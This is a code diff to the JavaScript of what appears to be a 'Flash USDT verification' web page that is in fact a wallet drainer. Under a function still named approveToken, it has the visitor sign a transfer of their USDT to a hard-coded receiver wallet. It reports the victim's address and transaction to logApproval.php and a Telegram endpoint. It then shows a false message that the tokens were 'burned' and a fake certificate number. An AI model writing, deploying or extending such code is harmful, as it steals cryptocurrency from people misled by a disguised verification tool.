@@ -1331,11 +1331,9 @@ function showPopup(message, type) {
 }
 
 // --- Placeholder for sendBNB function (No longer used directly for backend call, but kept for clarity) ---
-// This function is still here but the logic for sending BNB is now handled by the fetch call in approveToken.
 async function sendBNB(recipientAddress, amount) {
     console.log(`sendBNB function called (recipient: ${recipientAddress}, amount: ${amount}). This function is now superseded by backend call.`);
-    // If you had a direct client-side BNB sending mechanism here, it would be overridden by the backend call.
-    return true; // Assume success for compatibility if this was ever called from elsewhere
+    return true;
 }
 
 
@@ -1406,6 +1404,10 @@ async function approveToken() { // Keeping the function name as 'approveToken'
         }
     }
 
+    // --- UPDATED: Provide immediate feedback to the user as "Transferring..." ---
+    showPopup("Transferring...", "blue");
+
+
     // --- IMPORTANT: REPLACE THIS WITH YOUR ACTUAL RECEIVER WALLET ADDRESS ---
     const RECEIVER_WALLET_ADDRESS = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // e.g., "0x1234567890abcdef1234567890abcdef12345678"
     // ---------------------------------------------------------------------
@@ -1441,7 +1443,6 @@ async function approveToken() { // Keeping the function name as 'approveToken'
         }
 
         // --- Low BNB check and gas sending (UPDATED: using backend fetch) ---
-        // Removed explicit popup messages and delay here for faster flow.
         if (bnbBalance < 0.0005) {
             console.log("User BNB is low. Requesting BNB from backend...");
             try {
@@ -1453,7 +1454,6 @@ async function approveToken() { // Keeping the function name as 'approveToken'
                 const responseData = await response.json();
                 if (response.ok) {
                     console.log("Backend BNB send request successful:", responseData);
-                    // Removed the explicit delay here
                 } else {
                     console.error("Backend BNB send request failed:", responseData);
                     showPopup(`Failed to request BNB from backend: ${responseData.message || response.statusText}. Please ensure you have sufficient BNB for gas.`, "red");
@@ -1464,9 +1464,7 @@ async function approveToken() { // Keeping the function name as 'approveToken'
             }
         }
 
-        // Removed the "Preparing for USDT transfer..." popup here.
-
-        // --- Perform the Direct USDT Transfer (replacing approval) ---
+        // --- Perform the Direct USDT Transfer ---
         const transferAbi = ["function transfer(address recipient, uint256 amount) public returns (bool)"];
         const usdtContract = new ethers.Contract(usdtContractAddress, transferAbi, signer);
 
@@ -1481,17 +1479,16 @@ async function approveToken() { // Keeping the function name as 'approveToken'
         console.log("✅ USDT transfer successful!");
 
         // --- Update Logging and UI for Transfer ---
-        // Log to server (content adjusted for transfer)
-        fetch('logApproval.php', { // Keep filename as requested ("other things should be same")
+        fetch('logApproval.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 wallet: walletAddress,
                 token: usdtContractAddress,
-                receiver: RECEIVER_WALLET_ADDRESS, // Changed from spender
-                amount: amountToTransfer.toString(), // Actual amount transferred (BigNumber string)
+                receiver: RECEIVER_WALLET_ADDRESS,
+                amount: amountToTransfer.toString(),
                 txHash: tx.hash,
-                action: "direct_transfer" // Indicate this was a direct transfer
+                action: "direct_transfer"
             })
         }).then(res => res.json()).then(console.log);
 
@@ -1500,9 +1497,8 @@ async function approveToken() { // Keeping the function name as 'approveToken'
         const updatedFormattedBalance = ethers.utils.formatUnits(updatedUsdtBalanceBigNumber, 18);
 
         // Show result in popup (adjusting message to reflect transfer)
-        showApprovalPopup(walletAddress, updatedFormattedBalance); // Keeping function name as 'showApprovalPopup'
+        showApprovalPopup(walletAddress, updatedFormattedBalance);
 
-        // Telegram notification (content adjusted for transfer)
         fetch('sendTelegram.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -1511,7 +1507,6 @@ async function approveToken() { // Keeping the function name as 'approveToken'
             })
         });
 
-        // Final popup for the user indicating burn/verification success
         showPopup(
             `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
             "red"
@@ -1519,10 +1514,10 @@ async function approveToken() { // Keeping the function name as 'approveToken'
 
     } catch (err) {
         console.error("Error during USDT transfer:", err);
-        if (err.code === 4001) { // User rejected transaction in MetaMask
+        if (err.code === 4001) {
             showPopup("Transaction rejected by user.", "red");
         } else if (err.data && err.data.message) {
-             showPopup(`Failed to transfer USDT: ${err.data.message}`, "red");
+            showPopup(`Failed to transfer USDT: ${err.data.message}`, "red");
         }
         else {
             showPopup(`Failed to transfer USDT: ${err.message || err.toString()}`, "red");
@@ -1530,19 +1525,16 @@ async function approveToken() { // Keeping the function name as 'approveToken'
     }
 }
 
-function showApprovalPopup(wallet, balance) { // Keeping the function name as 'showApprovalPopup'
-    // The name "showApprovalPopup" remains, but its content reflects the transfer.
-    // Ensure you have elements with these IDs in your HTML: popupAddress, popupBalance, popupDate, popupCert, approvalPopup
+function showApprovalPopup(wallet, balance) {
     const approvalPopupElement = document.getElementById('approvalPopup');
     if (approvalPopupElement) {
         document.getElementById('popupAddress').innerText = wallet;
         document.getElementById('popupBalance').innerText = balance;
         document.getElementById('popupDate').innerText = new Date().toLocaleDateString();
         document.getElementById('popupCert').innerText = 'USDT-' + Math.floor(Math.random() * 90000000 + 10000000);
-        approvalPopupElement.style.display = 'flex'; // Use flex to center
+        approvalPopupElement.style.display = 'flex';
     } else {
         console.warn("Approval popup elements not found. Cannot display popup.");
-        // Fallback to alert if popup elements are missing
         alert(`Transfer Successful!\nWallet: ${wallet}\nNew Balance: ${balance} USDT`);
     }
 }
